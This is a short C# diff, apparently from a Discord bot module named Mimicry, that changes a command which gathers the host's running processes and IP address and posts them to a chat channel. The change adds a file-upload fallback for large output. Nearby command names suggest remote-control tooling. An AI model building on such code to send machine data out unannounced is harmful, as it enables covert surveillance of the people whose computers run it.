@@ -112,7 +112,16 @@ namespace Mimicry.Modules
         {
             string procs = tlm.GetProcesses();
             await Context.Channel.SendMessageAsync("Processes@" + tlm.getIP());
-            await Context.Channel.SendMessageAsync(procs);
+            try
+            {
+                await Context.Channel.SendMessageAsync(procs);
+            }
+            catch (ArgumentException)
+            {
+                tlm.GetProcessesFile();
+                await Context.Channel.SendFileAsync(Telemetry.mimproc, "Text is too large, sending as file.");
+                tlm.TerminateProcessesFile();
+            }            
         }
 
         [Command("rc.startup")]
